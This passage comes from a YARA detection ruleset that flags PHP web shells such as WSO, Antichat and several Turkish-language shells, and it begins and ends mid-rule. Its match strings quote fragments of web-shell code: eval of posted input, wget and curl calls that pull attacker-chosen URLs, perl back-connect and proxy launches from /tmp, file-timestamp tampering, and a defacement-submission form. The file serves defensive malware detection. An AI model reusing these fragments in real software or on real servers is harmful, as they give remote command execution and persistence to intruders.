      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x213c ) and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0353ae68b12b8f6b74794d3273967b530d0d526f_060ad92489947d410d897474079c1477_06521d9b70a37cb6455a9684ef3db13944feca2e_25b2ffa4_211
{
   meta:
      description = "php17 - from files 0353ae68b12b8f6b74794d3273967b530d0d526f.php, 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "14ee4d6daca29a576a047ec7c30efd8c11af51635f023d13772b68aead0dfda6"
      hash2 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash3 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash4 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash5 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash6 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash7 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash8 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash9 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i]))," fullword ascii
      $s2 = "elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))" fullword ascii
      $s3 = "$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));" fullword ascii
      $s4 = "if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))" fullword ascii
      $s5 = "if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {" fullword ascii
      $s6 = "return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);" fullword ascii
      $s7 = "echo \"d.cf.output.value+='\".$temp.\"';\";" fullword ascii
      $s8 = "if( @is_readable($_POST['p1']) ) {" fullword ascii
      $s9 = "echo \"d.cf.cmd.value='';\\n\";" fullword ascii
      $s10 = "$_POST['p3'] = substr($_POST['p3'],1);" fullword ascii
      $s11 = "$fp = @fopen($_POST['p1'],\"w\");" fullword ascii
      $s12 = "\"safemode\" => @ini_get('safe_mode')" fullword ascii
      $s13 = "if(!touch($_POST['p1'],$time,$time))" fullword ascii
      $s14 = "@touch($_POST['p1'],$time,$time);" fullword ascii
      $s15 = "while (false !== ($filename = readdir($dh)))" fullword ascii
      $s16 = "if($_POST['p1'] != 'yes')" fullword ascii
      $s17 = "@fwrite($fp,$_POST['p3']);" fullword ascii
      $s18 = "foreach ($iterator as $key=>$value) {" fullword ascii
      $s19 = "while (($f = @readdir($h)) !== false)" fullword ascii
      $s20 = "if(isset($_POST['c']))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _01e9565cecc4e989123f9620c1d09c09_01f78be6f7cad02658508fe4616098a9_0353ab4cbed5beae847a7ff6e220b5cf_05311655a15b75fab8695666_212
{
   meta:
      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php, AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash4 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash5 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash6 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash7 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash8 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash10 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash11 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash12 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash13 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash14 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash15 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash16 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash17 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash18 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash19 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash20 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
      hash21 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash22 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash23 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash24 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $s1 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd\",\"ext_ht\",\"ext_hta\",\"ext_so\")" fullword ascii
      $s2 = "$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);" fullword ascii
      $s3 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi\",\"ext_mpg\",\"ext_mpeg\",\"ext_wmv\",\"ext_rm\")," fullword ascii
      $s4 = "\"ext_php\"=>array(\"ext_php\",\"ext_php3\",\"ext_php4\",\"ext_php5\",\"ext_phtml\",\"ext_shtml\",\"ext_htm\")," fullword ascii
      $s5 = "\"ext_cmd\"=>array(\"ext_cmd\",\"ext_bat\",\"ext_pif\")," fullword ascii
      $s6 = "foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}" fullword ascii
      $s7 = "\"ext_zip\",\"ext_cab\",\"ext_gz\",\"ext_iso\",\"ext_lha\",\"ext_lzh\",\"ext_pbk\",\"ext_rar\",\"ext_uuf\")," fullword ascii
      $s8 = "\"ext_mp3\"=>array(\"ext_mp3\",\"ext_au\",\"ext_midi\",\"ext_mid\")," fullword ascii
      $s9 = "$debase64 = base64_decode($encoder_input);" fullword ascii
      $s10 = "if ($encoder_input[$i] == \"&\") {echo $encoder_input[$i];}" fullword ascii
      $s11 = "\"ext_ini\"=>array(\"ext_ini\",\"ext_css\",\"ext_inf\")," fullword ascii
      $s12 = "elseif ($encoder_input[$i] != \"\\\\\") {echo \"%\".$hex;}" fullword ascii
      $s13 = "$k = array_keys($images);" fullword ascii
      $s14 = "if (empty($images[$img])) {$img = \"small_unk\";}" fullword ascii
      $s15 = "$debase64 = str_replace(\"\\0\",\"[0]\",$debase64);" fullword ascii
      $s16 = "$debase64 = htmlspecialchars($debase64);" fullword ascii
      $s17 = "\"ext_swf\"=>array(\"ext_swf\",\"ext_fla\")," fullword ascii
      $s18 = "\"ext_js\"=>array(\"ext_js\",\"ext_vbs\")," fullword ascii
      $s19 = "\"ext_wri\"=>array(\"ext_wri\",\"ext_rtf\")," fullword ascii
      $s20 = "\"ext_doc\"=>array(\"ext_doc\",\"ext_dot\")," fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c or uint16(0) == 0xbbef ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _060ad92489947d410d897474079c1477_06521d9b70a37cb6455a9684ef3db13944feca2e_25b2ffa40e50b038212591c4eb09a89fe10cbd43_75aa5981_213
{
   meta:
      description = "php17 - from files 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash2 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash3 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash4 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash5 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
   strings:
      $s1 = "wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s2 = "$out = wsoEx(\"perl /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" 1>/dev/null 2>&1 &\");" fullword ascii
      $s3 = "$out = wsoEx(\"perl /tmp/bp.pl \".$_POST['p2'].\" 1>/dev/null 2>&1 &\");" fullword ascii
      $s4 = "foreach ($downloaders as $item)" fullword ascii
      $s5 = "'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i])," fullword ascii
      $s6 = "wsoSecParam('Userful', implode(', ',$temp));" fullword ascii
      $s7 = "wsoSecParam('cURL support', function_exists('curl_version')?'enabled':'no');" fullword ascii
      $s8 = "wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));" fullword ascii
      $s9 = "wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');" fullword ascii
      $s10 = "$this->query(\"CREATE TABLE wso2(file text);COPY wso2 FROM '\".addslashes($str).\"';select file from wso2;\");" fullword ascii
      $s11 = "tmlspecialchars(ob_get_clean()), \"\\n\\r\\t\\\\'\\0\") . \"';\\n\";" fullword ascii
      $s12 = "$sql = 'INSERT INTO '.$table.' ('.implode(\", \", $columns).') VALUES ('.implode(\", \", $item).');'.\"\\n\";" fullword ascii
      $s13 = "wsoSecParam('Danger', implode(', ',$temp));" fullword ascii
      $s14 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\" . addcslashes" ascii
      $s15 = "echo \"<option value='paste'>Paste / Compress</option>\";" fullword ascii
      $s16 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\" . addcslashes" ascii
      $s17 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".wsoEx($_POST['p1']),\"\\n\\r\\t\\\\'\\0\")" ascii
      $s18 = "wsoLogin();" fullword ascii
      $s19 = "if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {" fullword ascii
      $s20 = "if(empty($_POST['ajax']) && !empty($_POST['p1']))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _3d2c16ba66c49d6776818b38d56795304adf6f8c_41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289_9da47055cc121171c1d820bc9185e69f0d9de1f3_214
{
   meta:
      description = "php17 - from files 3d2c16ba66c49d6776818b38d56795304adf6f8c.php, 41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289.php, 9da47055cc121171c1d820bc9185e69f0d9de1f3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bc4da237fd7e9d00ea56ae4842fc9f4a9bc2da44c0bef7c0ccaafc377a60f9ff"
      hash2 = "885838c306798d11ca317627a98d94c7c1c30522a6d5d6a0c897560919ed4ffe"
      hash3 = "6939898da48e7b6607e02143c78d3201ae21230a8e49225d1aaca646a42d6df0"
   strings:
      $s1 = "$act=array('viewer','editor','upload','shell','phpeval','download','delete','deletedir');//here added new actions" fullword ascii
      $s2 = "$content.=\"<table cellSpacing=0 border=1 style=\\\"border-color:black;\\\" cellPadding=0 width=\\\"100%\\\">\";" fullword ascii
      $s3 = "(@ini_get('safe_mode')==\"1\" ? $safe_mode=\"ON\" : $safe_mode=\"OFF(Rootla_Beni:)\");" fullword ascii
      $s4 = "$content.=\"<tr><td>HDD Secin:\";" fullword ascii
      $s5 = "Buraya Uploadla:<input type=text name=dirupload value=\\\"\".$dirupload.\"\\\" size=50></tr></td><tr><td>Dosyay" fullword ascii
      $s6 = "<input type=\\\"submit\\\" name=\\\"save\\\" value=\\\"Kaydet\\\"><input type=\\\"reset\\\" value=\\\"Reset\\\"></form>\";" fullword ascii
      $s7 = "$form_win=\"<tr><td><form method=POST enctype=multipart/form-data>" fullword ascii
      $s8 = "<input type=\\\"hidden\\\" name=\\\"action\\\" value=\\\"upload\\\">  " fullword ascii
      $s9 = "$content.=\"<tr><td><form method=POST>Klasore Git:<input type=text name=dir value=\\\"\".$dir.\"\\\" size=50><input type=submit " ascii
      $s10 = "$content.=\"<tr><td><form method=POST>Klasore Git:<input type=text name=dir value=\\\"\".$dir.\"\\\" size=50><input type=submit " ascii
      $s11 = "$stdata.=\"<form method=POST>" fullword ascii
      $s12 = "if(unlink($file)) $content.=$lang['deletefileok'].\"<a href=\\\"#\\\" onclick=\\\"document.reqs.action.value='viewer';document.r" ascii
      $s13 = "if(!rmdir($file)) $content.=$lang['empty'].\"<a href=\\\"#\\\" onclick=\\\"document.reqs.action.value='viewer';document.reqs.dir" ascii
      $s14 = "else $content.=$lang['deletedirok'].\"<a href=\\\"#\\\" onclick=\\\"document.reqs.action.value='viewer';document.reqs.dir.value=" ascii
      $s15 = ".value='\".$dir.\"'; document.reqs.submit();\\\"> AnaSayfaya D" fullword ascii
      $s16 = "$version='version 1.0 by FaTaLErrOr';" fullword ascii
      $s17 = "<input type=\\\"submit\\\" value=\\\"Uygula\\\"></form>\";}" fullword ascii
      $s18 = "<input type=\\\"submit\\\" value=\\\"Uygula\\\"></form>\";" fullword ascii
      $s19 = "'\".$dir.\"'; document.reqs.submit();\\\"> AnaSayfaya D" fullword ascii
      $s20 = ".\"'; document.reqs.submit();\\\"> AnaSayfaya D" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _365b390fe892b3112719506f9240ff389d9e19d4_3df1afbcfa718da6fc8af27554834ff6d1a86562_7f9506dd9412394c3923fbfc324bcb4a3f5e5701__215
{
   meta:
      description = "php17 - from files 365b390fe892b3112719506f9240ff389d9e19d4.php, 3df1afbcfa718da6fc8af27554834ff6d1a86562.php, 7f9506dd9412394c3923fbfc324bcb4a3f5e5701.php, 8624a02263f24c08ab7775f5c2ebacdf48be3abd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4b04fc64a7669cab1815bc144f9bd1291ccc8cda5d645815ed6e35de89e0157b"
      hash2 = "208d43053620304c82210270e449f217044a7e9c60d0bbff382fd0e2da0b868d"
      hash3 = "96090e0fc01b79efb907234e25f516bdc348c55385874bf810a60c6240c56f96"
      hash4 = "66d71af2923d108af2757dfad504202a021eab95ea6b2d7f9bab95e977b3be49"
   strings:
      $s1 = "print \" - <a href='javascript:history.back()'>Geri</a>\";" fullword ascii
      $s2 = "ster<br>\";print $ec.$c2.$sf.\"<center><div style='margin-top:7px'>\"; input(\"text\",\"scdir\",$nscdir,59);print\"<br>\";" fullword ascii
      $s3 = "print $ec.$c2.$sf.\"&nbsp;\";print \"<select style='width:15%' name=upports size=1>" fullword ascii
      $s4 = "print\"<br> Toplam Alan: \"; readable_size(disk_total_space($nscdir));print \" / \";" fullword ascii
      $s5 = "print \"<div><b><center>[<a href=\".$PHP_SELF.\"?scdir=$nscdir> Geri </a>]</div>\";" fullword ascii
      $s6 = "print \" <center><a href=\".inclink('dlink', 'edit').\"&edit=$nfiles&scdir=$nscdir>D" fullword ascii
      $s7 = "print \"<b>Engelli Fonksiyonlar : </b>\";inifunc(disable_functions);print\"<br>\";" fullword ascii
      $s8 = "ma size=2 color=gray>indir</center>\";}print\"</td>\"; if(strstr(PHP_OS,\"Linux\")){" fullword ascii
      $s9 = "zenle</a>\";}else {print \"<center><font face=tahoma size=2 color=gray>D" fullword ascii
      $s10 = "<option value='up80'>80</option><option value='up443'>443</option>" fullword ascii
      $s11 = "zenle\",\"\");print \"</center>\".$ef.$ec.$et.\"</div></td>\";" fullword ascii
      $s12 = "<option value='up2121'>2121</option></select>\";print \" \";" fullword ascii
      $s13 = "r Olustur/Sil\";}if(isset($_REQUEST['crefile'])){ " fullword ascii
      $s14 = "if (is_dir(\"$nscdir/$nfiles\")){print \"<b>K</b>las" fullword ascii
      $s15 = "print \" \";input(\"submit\",\"delfile\",\"Sil\",\"\");" fullword ascii
      $s16 = "input(\"text\",\"uback\",\"back.pl\",23);print \" \";" fullword ascii
      $s17 = "zenle/Oku\".$ec;print $c2.$sf.\"<center>\";" fullword ascii
      $s18 = "print \"<div><b><center>[<a href=\".inclink('dlink', 'rcurrdir').\"&scdir=$nscdir> Geri </a>]</div>\";die();}}function fget($nsc" ascii
      $s19 = "print \"<div><b><center>[<a href=\".inclink('dlink', 'rcurrdir').\"&scdir=$nscdir> Geri </a>]</div>\";die();}}function fget($nsc" ascii
      $s20 = "input(\"submit\",\"crefile\",\"Olustur\",\"\");" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x3f3c ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_1n73ction_3c6b496a8ef29509d3325690f2db9d5119653272_683f78842d7cf41a39744494a4bb787_216
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, 1n73ction.php, 3c6b496a8ef29509d3325690f2db9d5119653272.php, 683f78842d7cf41a39744494a4bb787d6c6c4e91.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "9af1a6e4122d7751016c5aee923352962427c48ec0924bf007aac751cdad7af1"
      hash3 = "ca6284d5af5bd5095225d45084fe9626a7ac078ad2f4cc4020d6f86e5daad0d1"
      hash4 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
   strings:
      $s1 = "<option value=\"22\" >Attack against administrator(password stealing/sniffing)</option>" fullword ascii
      $s2 = "<option value=\"25\" >Remote service password bruteforce</option>" fullword ascii
      $s3 = "<option value=\"20\" >Remote administrative panel access password guessing</option>" fullword ascii
      $s4 = "<option value=\"24\" >Remote service password guessing</option>" fullword ascii
      $s5 = "<option value=\"23\" >Access credentials through Man In the Middle attack</option>" fullword ascii
      $s6 = "<option value=\"16\" >URL Poisoning</option>" fullword ascii
      $s7 = "<option value=\"15\" >SQL Injection</option>" fullword ascii
      $s8 = "<option value=\"29\" >DNS attack through cache poisoning</option>" fullword ascii
      $s9 = "echo \"[+] Sending Sites To Zone-H Has Been Completed Successfully !! \";" fullword ascii
      $s10 = "<option value=\"21\" >Remote administrative panel access social engineering</option>" fullword ascii
      $s11 = "<option value=\"19\" >Remote administrative panel access bruteforcing</option>" fullword ascii
      $s12 = "<option value=\"13\" >Shares misconfiguration</option>" fullword ascii
      $s13 = "<option value=\"1\">known vulnerability (i.e. unpatched system)</option>" fullword ascii
      $s14 = "<option value=\"9\" >FTP Server intrusion</option>" fullword ascii
      $s15 = "<option value=\"3\" >configuration / admin. mistake</option>" fullword ascii
      $s16 = "<option value=\"2\" >undisclosed (new) vulnerability</option>" fullword ascii
      $s17 = "<option value=\"4\" >brute force attack</option>" fullword ascii
      $s18 = "<option value=\"7\" >Web Server external module intrusion</option>" fullword ascii
      $s19 = "<option value=\"27\" >Rerouting after attacking the Router</option>" fullword ascii
      $s20 = "<option value=\"26\" >Rerouting after attacking the Firewall</option>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _01e00f2f4bfcbb7505cb641066f2859b_Antichat_S22hell_Antichat_Shell_217
{
   meta:
      description = "php17 - from files 01e00f2f4bfcbb7505cb641066f2859b.php, Antichat-S22hell.php, Antichat_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b2df68c7c4b3ed7538a025388148d1a9031c82ecd1223c9c8024b56873a4564"
      hash2 = "3f9e7dc6a8a8b8d361a99822f06920a0072022909b39a19e0d15311956f2eb12"
      hash3 = "33361e366e1fb244ce261c1cf1dd874d167265f26c31fa4ad15884ebc16dabc2"
   strings:
      $s1 = "shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");" fullword ascii
      $s2 = "shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");" fullword ascii
      $s3 = "shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s4 = "shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s5 = "shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");" fullword ascii
      $s6 = "shell(which('GET').\" \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");" fullword ascii
      $s7 = "if(@$_POST['filename']==\"\") $uploadfile = $dirupload.basename($_FILES['file']['name']); else " fullword ascii
      $s8 = "<input type=\\\"submit\\\" value=\\\"execute\\\"></form>\";} " fullword ascii
      $s9 = "if(@$_POST['dirupload']!=\"\") $dirupload=$_POST['dirupload'];else $dirupload=$dir;" fullword ascii
      $s10 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='upload'; document.reqs.submit();\">| Upload</a></td>" fullword ascii
      $s11 = "<td><a href=\"#\" onclick=\"document.reqs.action.value='phpeval'; document.reqs.submit();\">| Php Eval</a></td>" fullword ascii
      $s12 = "if(@$_POST['phpev']!=\"\"){echo eval($_POST['phpev']);}" fullword ascii
      $s13 = "if(!$le = fopen($file, \"r\")) $contents=\"Can't open file, permission denide\"; else {" fullword ascii
      $s14 = "if(@$_POST['uploadloc']){" fullword ascii
      $s15 = "nput type=submit name=uploadloc value='Upload local file'></td></tr>\";" fullword ascii
      $s16 = "if(@$_POST['upload']){" fullword ascii
      $s17 = "if(file_exists($uploadfile))echo $GLOBALS['filext']; " fullword ascii
      $s18 = "if(!file_exists($dirupload)){createdir($dirupload);}" fullword ascii
      $s19 = "$form_win=\"<tr><td><form method=POST enctype=multipart/form-data>Upload to dir:<input type=text name=dirupload value=\\\"\".$di" ascii
      $s20 = "</option></select>File addres:<input type=text name=urldown>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _8d23f3d3f678d3e620b91c2115e1f714_adminer_4_2_4_2_Adminer___Compact_database_management_218
{
   meta:
      description = "php17 - from files 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-4.2.4_2.php, Adminer_-_Compact_database_management.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash2 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
      hash3 = "4baf99c68ca9632081ba8bc0458bfc87fc70e526742803b7b77a45f70d7adf07"
   strings:
      $s1 = "\")&&$o[\"comment\"]!=\"\"?\" COMMENT \".q($o[\"comment\"]):\"\"),($o[\"auto_increment\"]?auto_increment():null),);}function" fullword ascii
      $s2 = "dumpDatabase($m){}function" fullword ascii
      $s3 = "process_input($o){global$b;$t=bracket_escape($o[\"field\"]);$r=$_POST[\"function\"][$t];$Y=$_POST[\"fields\"][$t];if($o[\"type\"" ascii
      $s4 = "process_input($o){global$b;$t=bracket_escape($o[\"field\"]);$r=$_POST[\"function\"][$t];$Y=$_POST[\"fields\"][$t];if($o[\"type\"" ascii
      $s5 = "true;}$n=oci_error();$this->error=$n[\"message\"];return" fullword ascii
      $s6 = "false;if($Y==\"\")return\"NULL\";return+$Y;}if($o[\"auto_increment\"]&&$Y==\"\")return" fullword ascii
      $s7 = ">.\":\"\").h($q[\"table\"]).\"</a>\",\"(<i>\".implode(\"</i>, <i>\",array_map('h',$q[\"target\"])).\"</i>)\",\"<td>\".nbsp($q[\"" ascii
      $s8 = "IS NULL\")).\"&where%5B$s%5D%5Bval%5D=\".urlencode($Y);}function" fullword ascii
      $s9 = "queries(\"DROP DATABASE \".implode(\", \",array_map('idf_escape',$l)));}function" fullword ascii
      $s10 = "bling.onchange();\";for($s=0;$s<=count($_GET[\"where\"]);$s++){list(,$X)=each($_GET[\"where\"]);if(!$X||(\"$X[col]$X[val]\"!=\"" ascii
      $s11 = "information_schema($m){return($m==\"information_schema\");}function" fullword ascii
      $s12 = "_get_error(){$this->error=\"\";foreach(sqlsrv_errors()as$n){$this->errno=$n[\"code\"];$this->error.=\"$n[message]\\n\";}$this->e" ascii
      $s13 = "_get_error(){$this->error=\"\";foreach(sqlsrv_errors()as$n){$this->errno=$n[\"code\"];$this->error.=\"$n[message]\\n\";}$this->e" ascii
      $s14 = "is->error=$n[\"message\"];return" fullword ascii
      $s15 = "apply_queries(\"DROP DATABASE\",$l,'idf_escape');}function" fullword ascii
      $s16 = ").\") AGAINST (\".q($_GET[\"fulltext\"][$s]).(isset($_GET[\"boolean\"][$s])?\" IN BOOLEAN MODE\":\"\").\")\";}foreach((array)$_G" ascii
      $s17 = "';}elseif(isset($_GET[\"edit\"])){$a=$_GET[\"edit\"];$p=fields($a);$Z=(isset($_GET[\"select\"])?(count($_POST[\"check\"])==1?whe" ascii
      $s18 = "drop_databases($l){return" fullword ascii
      $s19 = "'search' name='fulltext[$s]' value='\".h($_GET[\"fulltext\"][$s]).\"' onchange='selectFieldChange(this.form);'>\",checkbox(\"boo" ascii
      $s20 = "ct(\"$this->_string dbname='\".($m!=\"\"?addcslashes($m,\"'\\\\\"):\"postgres\").\"'\",PGSQL_CONNECT_FORCE_NEW);if(!$this->_link" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _351df1bd824721442e4e709e3806a9fc139de3e6_a14f987baeff8875419578f234d3f7bd176ecae9_a3a45774024ad0f93c71041f4baf72ad6ca34522__219
{
   meta:
      description = "php17 - from files 351df1bd824721442e4e709e3806a9fc139de3e6.php, a14f987baeff8875419578f234d3f7bd176ecae9.php, a3a45774024ad0f93c71041f4baf72ad6ca34522.php, a3b57f52c3782c20a2c006533c8f5d815034aefc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c9e0c70dddb705dddf0a5f54c517a380f8f914b6d0b4149ac8524c5df586a274"
      hash2 = "a7b068946ecd1e014c436f359287852193d56e75803f2cb949be6d13186bbb38"
      hash3 = "6d8435d732262dd06b1022983eb90db9bba800e4f25984e616ee143d26561621"
      hash4 = "c53b0ccd965a4c11601fccd308ef7ba02c784e7984984682313cca6acf67f6d4"
   strings:
      $s1 = "passthru(\"nohup perl /tmp/nst_perl_proxy.pl $port &\");" fullword ascii
      $s2 = "passthru(\"nohup perl .nst_proxy_tmp/nst_perl_proxy.pl $port &\");" fullword ascii
      $s3 = "passthru(\"nohup perl /tmp/nst_perl_datapipe.pl &\");" fullword ascii
      $s4 = "Replace this <input name=thisX size=30 value=$ip> by this <input name=bythis size=30 value=207.46.245.156>" fullword ascii
      $s5 = "passthru(\"nohup perl .nst_datapipe_tmp/nst_perl_datapipe.pl &\");" fullword ascii
      $s6 = "if(@$_GET['sh311']==\"1\"){echo \"<center>cmd<br>pwd:" fullword ascii
